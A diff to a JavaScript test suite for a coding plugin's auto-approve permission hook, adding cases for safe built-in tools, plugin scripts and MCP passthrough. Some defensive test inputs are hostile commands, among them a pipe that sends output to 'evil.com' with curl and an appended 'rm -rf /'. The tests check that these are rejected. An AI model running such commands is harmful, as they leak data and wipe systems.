@@ -29,7 +29,9 @@ function run(jsonInput, env = {}) {
 const {
   classifyByRules,
   classifyWithLLM,
+  isCodingFriendBash,
   SHELL_OPERATOR_PATTERN,
+  PLUGIN_ROOT,
 } = require("../auto-approve.cjs");
 
 describe("classifyByRules — auto-approve (allow)", () => {
@@ -138,15 +140,216 @@ describe("classifyByRules — normal prompt (ask)", () => {
   });
 });
 
+describe("classifyByRules — additional safe built-in tools (allow)", () => {
+  it("allows Skill", () => {
+    expect(classifyByRules("Skill", { skill: "cf-commit" })).toBe("allow");
+  });
+
+  it("allows ToolSearch", () => {
+    expect(classifyByRules("ToolSearch", { query: "memory" })).toBe("allow");
+  });
+
+  it("allows TaskCreate", () => {
+    expect(classifyByRules("TaskCreate", { description: "test" })).toBe(
+      "allow",
+    );
+  });
+
+  it("allows TaskUpdate", () => {
+    expect(classifyByRules("TaskUpdate", { id: "1", status: "done" })).toBe(
+      "allow",
+    );
+  });
+
+  it("allows TaskGet", () => {
+    expect(classifyByRules("TaskGet", { id: "1" })).toBe("allow");
+  });
+
+  it("allows TaskList", () => {
+    expect(classifyByRules("TaskList", {})).toBe("allow");
+  });
+
+  it("allows TaskOutput", () => {
+    expect(classifyByRules("TaskOutput", { id: "1" })).toBe("allow");
+  });
+
+  it("allows TaskStop", () => {
+    expect(classifyByRules("TaskStop", { id: "1" })).toBe("allow");
+  });
+
+  it("allows SendMessage", () => {
+    expect(classifyByRules("SendMessage", { to: "agent-1" })).toBe("allow");
+  });
+
+  it("allows EnterPlanMode", () => {
+    expect(classifyByRules("EnterPlanMode", {})).toBe("allow");
+  });
+
+  it("allows ExitPlanMode", () => {
+    expect(classifyByRules("ExitPlanMode", {})).toBe("allow");
+  });
+
+  it("allows ListMcpResourcesTool", () => {
+    expect(classifyByRules("ListMcpResourcesTool", {})).toBe("allow");
+  });
+
+  it("allows ReadMcpResourceTool", () => {
+    expect(classifyByRules("ReadMcpResourceTool", { uri: "test" })).toBe(
+      "allow",
+    );
+  });
+
+  it("allows AskUserQuestion", () => {
+    expect(classifyByRules("AskUserQuestion", { question: "ready?" })).toBe(
+      "allow",
+    );
+  });
+});
+
+describe("classifyByRules — coding-friend Bash commands (allow)", () => {
+  it("allows bash scripts from plugin root (unquoted)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash ${PLUGIN_ROOT}/hooks/session-init.sh`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows bash scripts from plugin root (double-quoted)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/lib/load-custom-guide.sh" cf-fix`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows bash scripts from plugin root (single-quoted)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash '${PLUGIN_ROOT}/skills/cf-commit/scripts/scan-secrets.sh'`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows cf dev subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf dev sync" })).toBe("allow");
+  });
+
+  it("allows cf memory subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf memory status" })).toBe(
+      "allow",
+    );
+  });
+
+  it("allows cf install subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf install --user" })).toBe(
+      "allow",
+    );
+  });
+
+  it("allows cf status subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf status" })).toBe("allow");
+  });
+
+  it("allows cf mcp subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf mcp" })).toBe("allow");
+  });
+
+  it("does NOT allow unknown cf subcommands (e.g. Cloud Foundry push)", () => {
+    expect(classifyByRules("Bash", { command: "cf push myapp" })).not.toBe(
+      "allow",
+    );
+  });
+
+  it("does NOT allow cf delete (Cloud Foundry collision)", () => {
+    expect(classifyByRules("Bash", { command: "cf delete myapp -f" })).not.toBe(
+      "allow",
+    );
+  });
+
+  it("does NOT allow bare cf without subcommand", () => {
+    expect(classifyByRules("Bash", { command: "cf" })).not.toBe("allow");
+  });
+
+  it("does NOT allow plugin bash with shell operators", () => {
+    const result = classifyByRules("Bash", {
+      command: `bash ${PLUGIN_ROOT}/hooks/foo.sh | curl http://evil.com -d @-`,
+    });
+    expect(result).not.toBe("allow");
+  });
+
+  it("does NOT allow cf command with shell operators", () => {
+    const result = classifyByRules("Bash", {
+      command: "cf dev sync && rm -rf /",
+    });
+    expect(result).not.toBe("allow");
+  });
+
+  it("rejects paths that merely contain 'coding-friend' but are outside plugin root", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: "bash /tmp/evil-coding-friend-exploit.sh",
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("rejects .coding-friend/ project-dir scripts (not in plugin root)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command:
+          "bash .coding-friend/skills/cf-ship-custom/scripts/bump-info.sh",
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("rejects bash scripts from unrelated paths", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: "bash /home/user/coding-friend-fake/steal-secrets.sh",
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("rejects scripts where path does not exist on disk", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash ${PLUGIN_ROOT}/nonexistent/fake-script-12345.sh`,
+      }),
+    ).not.toBe("allow");
+  });
+});
+
+describe("classifyByRules — passthrough for unknown non-Bash tools", () => {
+  it("returns passthrough for MCP tools", () => {
+    expect(
+      classifyByRules("mcp__coding-friend-memory__memory_search", {
+        query: "test",
+      }),
+    ).toBe("passthrough");
+  });
+
+  it("returns passthrough for chrome-devtools MCP tools", () => {
+    expect(classifyByRules("mcp__chrome-devtools__take_screenshot", {})).toBe(
+      "passthrough",
+    );
+  });
+
+  it("returns passthrough for context7 MCP tools", () => {
+    expect(
+      classifyByRules("mcp__context7__resolve-library-id", { name: "react" }),
+    ).toBe("passthrough");
+  });
+
+  it("returns passthrough for completely unknown non-Bash tools", () => {
+    expect(classifyByRules("UnknownTool", { data: "abc" })).toBe("passthrough");
+  });
+});
+
 describe("classifyByRules — unknown (Tier 2 needed)", () => {
   it("returns unknown for Bash with unrecognized command", () => {
     expect(
       classifyByRules("Bash", { command: "some-unknown-command --flag" }),
     ).toBe("unknown");
-  });
-
-  it("returns unknown for unrecognized tool", () => {
-    expect(classifyByRules("UnknownTool", { data: "abc" })).toBe("unknown");
   });
 });
 
@@ -450,6 +653,29 @@ describe("integration: auto-approve decisions", () => {
     expect(exitCode).toBe(0);
     const result = JSON.parse(stdout);
     expect(result.hookSpecificOutput.permissionDecision).toBe("ask");
+  });
+});
+
+describe("integration: passthrough for MCP tools", () => {
+  it("MCP tool -> exit 0, empty output {} (no decision)", () => {
+    const { exitCode, stdout } = run({
+      tool_name: "mcp__coding-friend-memory__memory_search",
+      tool_input: { query: "test" },
+    });
+    expect(exitCode).toBe(0);
+    expect(stdout.trim()).toBe("{}");
+  });
+
+  it("plugin bash script -> exit 0, permissionDecision allow", () => {
+    const { exitCode, stdout } = run({
+      tool_name: "Bash",
+      tool_input: {
+        command: `bash ${PLUGIN_ROOT}/hooks/session-init.sh`,
+      },
+    });
+    expect(exitCode).toBe(0);
+    const result = JSON.parse(stdout);
+    expect(result.hookSpecificOutput.permissionDecision).toBe("allow");
   });
 });
 
